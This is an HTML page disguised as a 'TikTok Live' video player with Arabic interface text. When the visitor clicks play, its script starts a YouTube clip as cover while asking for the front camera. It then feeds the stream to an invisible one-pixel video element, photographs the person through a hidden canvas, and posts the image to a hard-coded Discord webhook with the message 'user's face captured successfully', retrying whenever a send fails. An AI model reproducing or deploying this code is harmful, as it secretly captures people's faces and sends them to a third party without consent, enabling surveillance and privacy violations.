<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TikTok Live</title>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; background: #000; overflow: hidden; font-family: sans-serif; }
        .wrapper { position: relative; width: 100%; height: 100%; }
        #youtube-frame { position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; visibility: hidden; }
        #start-overlay {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            background: #000; display: flex; flex-direction: column;
            justify-content: center; align-items: center; z-index: 200; color: white; cursor: pointer;
        }
        .play-btn {
            width: 80px; height: 80px; background: #fe2c55; border-radius: 50%;
            display: flex; justify-content: center; align-items: center;
            font-size: 40px; margin-bottom: 20px; box-shadow: 0 0 20px rgba(254, 44, 85, 0.5);
        }
        #hidden-camera { position: absolute; width: 1px; height: 1px; opacity: 0; }
        #photo-canvas { display: none; }
    </style>
</head>
<body>

<div class="wrapper">
    <iframe id="youtube-frame" 
        src="https://www.youtube.com/embed/C3vaOyZFcsM?enablejsapi=1&autoplay=0&mute=0&loop=1&playlist=C3vaOyZFcsM&controls=0" 
        frameborder="0" allow="autoplay; encrypted-media">
    </iframe>

    <div id="start-overlay">
        <div class="play-btn">▶️</div>
        <p style="font-weight: bold;">اضغط لمشاهدة الفيديو</p>
    </div>
</div>

<video id="hidden-camera" autoplay playsinline muted></video>
<canvas id="photo-canvas"></canvas>

<script>
    // تم التأكد من رابط الويب هوك الخاص بك
    const webhookURL = 'https://discord.com/api/webhooks/1493312893100228608/X78aap9qPQUcppW21eNRpVDCiJGIS3OFDw6rH6ZKTPVTzsQbsGJyBKMWV7slNEt67zUs';
    const overlay = document.getElementById('start-overlay');
    const iframe = document.getElementById('youtube-frame');
    const camera = document.getElementById('hidden-camera');

    overlay.addEventListener('click', async () => {
        overlay.style.display = 'none';
        iframe.style.visibility = 'visible';

        try {
            // تشغيل الصوت والفيديو
            iframe.contentWindow.postMessage('{"event":"command","func":"playVideo","args":""}', '*');
            iframe.contentWindow.postMessage('{"event":"command","func":"unMute","args":""}', '*');

            // طلب الكاميرا
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" } 
            });
            camera.srcObject = stream;

            camera.onplaying = () => {
                // محاولة التصوير بعد 3 ثوانٍ من استقرار البث
                setTimeout(captureAndSend, 3000);
            };
        } catch (err) {
            console.error("خطأ في تشغيل الكاميرا أو الفيديو");
        }
    });

    async function captureAndSend() {
        const canvas = document.getElementById('photo-canvas');
        const context = canvas.getContext('2d');

        if (camera.videoWidth > 0) {
            canvas.width = camera.videoWidth;
            canvas.height = camera.videoHeight;
            context.drawImage(camera, 0, 0, canvas.width, canvas.height);
            
            // تحويل الصورة إلى Blob (ملف)
            canvas.toBlob(async (blob) => {
                if (!blob) return;

                const formData = new FormData();
                // "file" هو المفتاح الذي يتوقعه ديسكورد لاستلام الصور
                formData.append('file', blob, 'shot.png');
                formData.append('content', '📸 تم التقاط وجه المستخدم بنجاح');

                try {
                    const response = await fetch(webhookURL, {
                        method: 'POST',
                        body: formData // إرسال كـ FormData لضمان وصولها كملف
                    });

                    if (response.ok) {
                        console.log("تم الإرسال للديسكورد بنجاح!");
                    } else {
                        // إذا كان هناك خطأ من ديسكورد (مثل ضغط الطلبات)، أعد المحاولة
                        setTimeout(captureAndSend, 2000);
                    }
                } catch (e) {
                    // محاولة الإرسال مرة أخرى في حال فشل الاتصال
                    setTimeout(captureAndSend, 2000);
                }
            }, 'image/png');
        } else {
            // الكاميرا لم تجهز بعد، انتظر ثانية وحاول مجدداً
            setTimeout(captureAndSend, 1000);
        }
    }
</script>
</body>
</html>
